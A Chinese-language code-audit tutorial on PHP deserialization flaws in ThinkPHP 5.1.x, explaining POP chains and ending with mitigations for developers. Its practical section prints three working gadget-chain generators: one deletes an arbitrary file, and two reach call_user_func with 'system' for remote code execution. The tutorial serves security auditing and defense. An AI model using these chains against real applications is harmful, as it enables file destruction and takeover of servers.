引言

在Web应用安全领域，代码审计是发现漏洞的核心手段之一。对于使用MVC框架（如ThinkPHP）开发的应用，审计人员不仅需要关注业务逻辑漏洞，更要深入框架底层，挖掘由于框架自身缺陷或使用不当引发的安全隐患。反序列化漏洞作为PHP应用中的“高危漏洞”，常因开发者对unserialize函数的误用或框架内部魔术方法的复杂调用链而被引入。本文将以ThinkPHP 5.1.x版本为背景，结合理论讲解与实战案例，深入剖析反序列化漏洞的审计方法、POP链构造技巧，帮助读者建立系统的框架审计思维。

一、PHP反序列化基础

1.1 序列化与反序列化

PHP序列化是将对象或数据结构转换为可存储/传输的字符串的过程，反序列化则是将字符串还原为对象。当反序列化的数据由攻击者控制时，攻击者可以构造恶意数据，在对象还原过程中触发特定的魔术方法，从而执行非预期操作。

1.2 关键魔术方法

PHP中的魔术方法在特定事件发生时自动调用，它们是构造反序列化利用链（POP链）的核心组件。以下列举审计中需重点关注的魔术方法：

魔术方法 触发条件
__wakeup() 反序列化时自动调用
__destruct() 对象被销毁时调用
__toString() 对象被当作字符串使用时调用
__get($name) 访问不可访问或不存在的属性时调用
__set($name, $value) 对不可访问或不存在的属性赋值时调用
__call($name, $args) 调用不可访问或不存在的方法时调用
__callStatic($name, $args) 静态上下文中调用不可访问的方法时调用
__invoke($...) 将对象当作函数调用时触发

1.3 反序列化漏洞原理

攻击者通过控制反序列化输入，构造一个包含恶意属性值的对象。当该对象被反序列化后，其魔术方法（如__destruct、__wakeup）会被自动调用，进而触发一系列方法调用，最终导向危险函数（如eval、call_user_func、文件操作函数等）。这一系列调用链被称为POP链（Property-Oriented Programming Chain）。

1.4 反序列化审计三要素

· 起点：反序列化后必然调用的魔术方法，如__destruct、__wakeup。
· 中间跳板：在调用链中起到桥梁作用的魔术方法，如__toString、__get、__call。
· 终点：最终执行的危险操作，如call_user_func、file_put_contents等。

二、ThinkPHP框架审计方法论

针对ThinkPHP框架的审计，可从以下三个维度展开：

2.1 版本不安全写法检测

· 本地复现版本对比：通过搭建与目标一致的框架版本，参考官方开发手册，对比项目中可能存在的不安全写法（如直接使用unserialize处理用户输入）。
· 代码审计工具辅助：使用静态分析工具（如RIPS、PhpStorm）扫描框架代码，寻找危险函数调用链。

2.2 版本自身漏洞检测

· 关注漏洞公告：定期查阅框架官方安全公告及第三方漏洞库（如GitHub上的漏洞收集项目）。
· 黑盒工具探测：使用漏洞扫描工具对目标应用进行黑盒测试，尝试触发已知漏洞的入口点（如参数污染、文件包含等）。

2.3 版本自身漏洞利用

· 根据漏洞提示定位触发点：漏洞描述中通常会提及受影响的函数或类，审计人员需深入分析这些函数，寻找可控变量。
· 构造满足条件的调用链：分析从触发点到最终危险函数的完整路径，确保每一步都满足调用条件（如属性可控、方法可访问）。

2.4 常用漏洞资源

· Mochazz/ThinkPHP-Vuln - ThinkPHP漏洞集合
· hughink/Thinkphp-All-vuln - 全版本漏洞复现

三、ThinkPHP反序列化漏洞实战

ThinkPHP 5.1.x版本（特别是5.1.16~5.1.40）存在多处反序列化漏洞，攻击者可通过构造POP链实现文件删除或远程代码执行。下面我们将通过两个典型案例，详细拆解POP链的构造过程。

案例一：文件删除POP链

漏洞起点：__destruct → removeFiles

在think\process\pipes\Windows类的析构函数中，调用了removeFiles方法：

```php
namespace think\process\pipes;

class Windows extends Pipes
{
    private $files = [];

    public function __destruct()
    {
        $this->removeFiles();
    }

    private function removeFiles()
    {
        foreach ($this->files as $file) {
            if (file_exists($file)) {
                @unlink($file);
            }
        }
    }
}
```

removeFiles方法遍历$files属性，对每个文件调用file_exists检查后执行unlink删除。若攻击者能够控制$files属性，即可在反序列化时删除任意文件。

POP链构造

我们只需实例化Windows类，并设置私有属性$files为要删除的文件路径。由于$files是私有属性，需要通过序列化字符串直接赋值。

```php
<?php
namespace think\process\pipes;

class Windows
{
    private $files = ['/var/www/html/install.lock']; // 目标文件
}

$a = new Windows();
echo base64_encode(serialize($a));
```

将生成的序列化数据传递给应用的反序列化点（如unserialize或Phar反序列化），即可触发文件删除。

触发方式

· 直接反序列化：若应用存在unserialize($_GET['data'])类似代码。
· Phar反序列化：通过Phar文件元数据触发，要求应用存在文件操作函数（如file_exists）且能够上传Phar文件。

案例二：RCE执行POP链（基于__call跳板）

该漏洞利用链更长，最终通过call_user_func执行系统命令。其调用流程如下：

__destruct → removeFiles → file_exists → __toString → toJson → toArray → visible → __call → isAjax → param → input → filterValue → call_user_func

关键点分析

1. __destruct触发文件删除，但file_exists的参数是我们可控的$files数组中的元素。我们需要让file_exists的参数是一个对象，从而触发该对象的__toString方法。
2. __toString跳板：ThinkPHP的Model类实现了__toString，返回toJson()的结果。toJson调用toArray，而toArray中会调用visible属性相关方法，最终触发__call。
3. __call跳板：当调用不存在的方法visible时，进入__call。我们可控__call的调用行为，通过设置$hook属性，将visible方法指向isAjax。
4. isAjax方法：该方法调用param获取请求参数，最终进入input方法，其中存在filterValue调用call_user_func的危险逻辑。

构造Payload

我们需要构造三个核心类：think\Request（负责最终执行）、think\Model（触发__toString）、think\process\pipes\Windows（起点）。

```php
<?php
namespace think;

// Request类：控制最终执行
class Request
{
    protected $hook = [];
    protected $filter;
    protected $mergeParam = true;
    protected $param = ['calc']; // 命令参数
    protected $config = [
        'var_ajax' => '',
    ];

    function __construct()
    {
        $this->hook = ['visible' => [$this, 'isAjax']];
        $this->filter = ['system'];
    }
}

// Model抽象类：触发__toString
abstract class Model
{
    protected $append = [];
    private $data = [];

    function __construct()
    {
        $this->append = ['coleak' => ['']];
        $this->data = ['coleak' => new Request()];
    }
}

namespace think\model;

use think\Model;

class Pivot extends Model
{
}

namespace think\process\pipes;

use think\model\Pivot;

class Windows
{
    private $files = [];

    function __construct()
    {
        $this->files = [new Pivot()];
    }
}

echo base64_encode(serialize(new Windows()));
```

链式调用详解

1. 反序列化Windows对象，触发__destruct → removeFiles。
2. removeFiles遍历$files，对每个元素调用file_exists。由于$files[0]是Pivot对象，file_exists会触发__toString。
3. Pivot继承自Model，Model的__toString调用toJson → toArray。
4. toArray中处理$append属性时，调用了$this->getAttr('coleak')，最终触发__call因为visible方法不存在。
5. __call根据$this->hook的设置，将visible的调用重定向到Request的isAjax方法。
6. isAjax调用param，param调用input，在input中通过filterValue执行call_user_func($this->filter, $this->param)，最终执行system('calc')。

案例三：另一种RCE链（基于getValue）

该链利用think\model\Pivot的getValue方法，最终同样到达call_user_func。核心路径为：

__destruct → removeFiles → file_exists → __toString → toJson → toArray → getAttr → getValue → call_user_func

关键点在于getValue中使用了$this->withAttr定义的动态函数调用。构造方式如下：

```php
<?php
namespace think\process\pipes {
    class Windows
    {
        private $files;
        public function __construct($files)
        {
            $this->files = array($files);
        }
    }
}

namespace think\model\concern {
    trait Conversion
    {
        protected $append = array("smi1e" => "1");
    }

    trait Attribute
    {
        private $data;
        private $withAttr = array("smi1e" => "system");

        public function get()
        {
            $this->data = array("smi1e" => "notepad");
        }
    }
}

namespace think {
    abstract class Model
    {
        use model\concern\Attribute;
        use model\concern\Conversion;
    }
}

namespace think\model {
    use think\Model;
    class Pivot extends Model
    {
        public function __construct()
        {
            $this->get();
        }
    }
}

namespace {
    $conver = new think\model\Pivot();
    $a = new think\process\pipes\Windows($conver);
    echo base64_encode(serialize($a));
}
```

该链将$withAttr设置为'system'，$data设置为'notepad'，当调用getValue时，会执行call_user_func('system', 'notepad')。

四、POP链构造思路总结

通过以上案例分析，我们可以总结出挖掘ThinkPHP反序列化POP链的一般步骤：

1. 寻找反序列化起点：优先关注__destruct和__wakeup，它们是反序列化后必然执行的入口。
2. 追踪可控变量：分析起点方法中是否有属性可以直接或间接控制，例如$this->files。
3. 识别危险函数：在方法调用链中寻找危险函数，如call_user_func、unlink、eval等。
4. 搭建跳板：利用__toString、__get、__call等魔术方法将可控属性传递给危险函数。例如，让file_exists的参数为对象，触发__toString；让__call将不可访问方法重定向到可控方法。
5. 串联完整路径：确保从起点到终点的每一步调用都满足条件（如属性存在、方法可访问、参数可控）。

五、审计与防范建议

5.1 开发者防范措施

· 避免反序列化外部数据：尽量不要使用unserialize处理用户输入，可使用JSON等安全格式替代。
· 及时更新框架：关注ThinkPHP官方安全更新，及时升级到修复版本。
· 类白名单：如果必须反序列化，可使用unserialize的$allowed_classes选项限制允许的类。
· 禁用危险函数：在php.ini中禁用system、exec等危险函数，或使用disable_functions限制。

5.2 审计人员技巧

· 熟悉框架源码：深入理解核心类的魔术方法及常见危险函数调用点。
· 动态调试：使用Xdebug等工具跟踪反序列化过程，观察属性传递和方法调用。
· 利用已知漏洞库：参考GitHub上的漏洞集合，快速定位可能存在问题的版本和类。
· 结合黑盒测试：通过参数fuzz、文件上传等方式寻找反序列化入口。

六、结语

ThinkPHP作为国内广泛使用的PHP框架，其安全性直接影响大量应用的安全。反序列化漏洞的挖掘需要扎实的PHP基础和对框架源码的深入理解。本文从理论到实战，系统阐述了框架审计的方法和POP链构造技巧，希望读者能够举一反三，在实际审计中灵活运用。安全是一场持续的攻防博弈，只有不断学习、深入源码，才能走在漏洞的前面。

---

参考资料：

· ThinkPHP官方开发手册
· Seebug Paper: ThinkPHP反序列化漏洞分析
· CSDN博客: ThinkPHP5反序列化漏洞复现
· Mochazz/ThinkPHP-Vuln
· hughink/Thinkphp-All-vuln
